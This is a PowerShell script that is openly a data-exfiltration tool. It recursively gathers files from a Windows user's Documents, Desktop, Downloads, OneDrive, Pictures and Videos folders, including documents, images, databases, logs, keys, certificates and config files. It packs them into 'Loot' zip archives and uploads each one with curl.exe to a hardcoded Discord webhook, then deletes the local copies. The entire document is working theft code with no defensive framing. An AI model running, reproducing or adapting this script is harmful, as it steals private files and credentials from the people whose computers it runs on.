

# Discord Webhook URL
$hookurl = "https://discord.com/api/webhooks/1203664437987254282/KGKtaF1re7Ou5pewLAYD4ZMdxBLNQTLKMm8ju02TUzTwYO76z6ROI5ozvB3voSa9dZIo"

# Function to exfiltrate files
Function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp/Loot$index.zip"

    # Define folders to search
    If ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    } else {
        $foldersToSearch = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
    }

    # Define file extensions to search for
    If ($FileType -ne $null) {
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }

    # Load compression library
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Create a new ZIP archive
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    # Search for files and add them to the ZIP archive
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    curl.exe -F file1=@"$zipFilePath" $hookurl
                    Remove-Item -Path $zipFilePath -Force
                    Sleep 1
                    $index++
                    $zipFilePath = "$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }

    # Finalize and send the last ZIP file
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl
    Remove-Item -Path $zipFilePath -Force
    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

# Execute the function
Exfiltrate